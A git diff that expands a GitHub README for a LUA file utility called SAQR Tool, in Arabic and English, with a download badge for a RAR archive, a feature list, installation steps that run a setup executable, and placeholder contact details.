@@ -1,2 +1,37 @@
-# SAQR-Tool
-"SAQR Tool" is a specialized tool for .LUA files, used for encryption and error correction.
+# 🦅 SAQR LUA Tool v18.3
+
+<p align="center">
+  <img src="https://via.placeholder.com/800x400?text=SAQR+TOOL+PREVIEW" alt="SAQR Tool Banner">
+</p>
+
+## 📌 نبذة عن الأداة (About)
+أداة صقر هي أداة متطورة مخصصة للتعامل مع ملفات LUA وتسهيل العمل للمطورين بواجهة عربية سهلة واستخدام احترافي.
+
+---
+
+## 🚀 التحميل (Download)
+لتحميل آخر إصدار من الأداة، اضغط على الرابط أدناه:
+
+[ ![Download SAQR Tool](https://img.shields.io/badge/Download-SAQR--LUA--Tool--v18.3-brightgreen?style=for-the-badge&logo=github) ](https://github.com/3zeez515/SAQR-Tool/raw/master/SAQR-LUA-Tool_v18.3.rar)
+
+---
+
+## ✨ المميزات (Features)
+* 🛠 **دعم كامل:** لجميع ملفات LUA.
+* ⚡ **سرعة عالية:** في معالجة البيانات وتثبيت السكربتات.
+* 💻 **واجهة مستخدم:** بسيطة ومنظمة.
+* 📦 **تثبيت تلقائي:** عبر ملف Setup.
+
+---
+
+## 🛠 طريقة التثبيت (Installation)
+1. قم بتحميل ملف الـ **RAR** من زر التحميل أعلاه.
+2. فك الضغط عن الملف باستخدام **WinRAR**.
+3. قم بتشغيل `SAQR_Tool_Setup_v18.3.exe` واتبع خطوات التثبيت.
+
+---
+
+## 📞 التواصل (Contact)
+إذا واجهت أي مشكلة أو تبي دعم فني:
+* **Discord:** `Your_Discord_ID`
+* **GitHub:** [3zeez515](https://github.com/3zeez515)
